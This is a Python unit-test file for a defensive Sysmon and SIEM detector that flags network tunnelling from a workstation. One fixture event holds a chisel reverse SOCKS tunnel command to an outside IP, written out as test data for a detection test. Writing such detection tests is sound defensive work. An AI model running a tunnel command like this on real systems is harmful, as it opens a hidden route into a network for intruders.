"""
Unit tests for enterprise Sysmon & SIEM telemetry correlation engine.
"""

import pytest
from src.defense.sysmon_detector import SysmonBridgeDetector, SysmonEventType
from src.defense.outsider_schema import BridgeMechanism
from src.data.bloodhound_loader import create_realistic_enterprise_ad_sample


def test_sysmon_process_create_detection():
    detector = SysmonBridgeDetector()
    graph = create_realistic_enterprise_ad_sample()

    payload = {
        "EventID": 1,
        "Computer": "WS-FINANCE-01.CORP.LOCAL",
        "User": "CORP\\jdoe",
        "ProcessId": 4892,
        "Image": "C:\\Users\\Public\\chisel.exe",
        "CommandLine": "chisel.exe client 198.51.100.44:8080 R:1080:socks",
    }

    alert = detector.ingest_event(payload, graph_data=graph)
    assert alert is not None
    assert alert.confidence >= 0.95
    assert alert.bridge_mechanism == BridgeMechanism.SOCKS_CHISEL_TUNNEL
    assert alert.insider_computer == "WS-FINANCE-01.CORP.LOCAL"
    assert alert.process_id == 4892
    assert alert.insider_node_idx is not None


def test_sysmon_network_connect_detection():
    detector = SysmonBridgeDetector()
    graph = create_realistic_enterprise_ad_sample()

    payload = {
        "EventID": 3,
        "Computer": "WS-FINANCE-01.CORP.LOCAL",
        "User": "CORP\\jdoe",
        "ProcessId": 4892,
        "DestinationIp": "198.51.100.44",
        "DestinationPort": 8080,
        "Protocol": "TCP",
    }

    alert = detector.ingest_event(payload, graph_data=graph)
    assert alert is not None
    assert alert.confidence >= 0.85
    assert alert.external_ip == "198.51.100.44"
    assert alert.external_port == 8080


def test_sysmon_benign_event_no_alert():
    detector = SysmonBridgeDetector()
    graph = create_realistic_enterprise_ad_sample()

    benign_payload = {
        "EventID": 1,
        "Computer": "WS-FINANCE-01.CORP.LOCAL",
        "User": "CORP\\jdoe",
        "ProcessId": 1200,
        "Image": "C:\\Windows\\system32\\notepad.exe",
        "CommandLine": "notepad.exe C:\\Users\\jdoe\\notes.txt",
    }

    alert = detector.ingest_event(benign_payload, graph_data=graph)
    assert alert is None
    assert len(detector.active_alerts) == 0
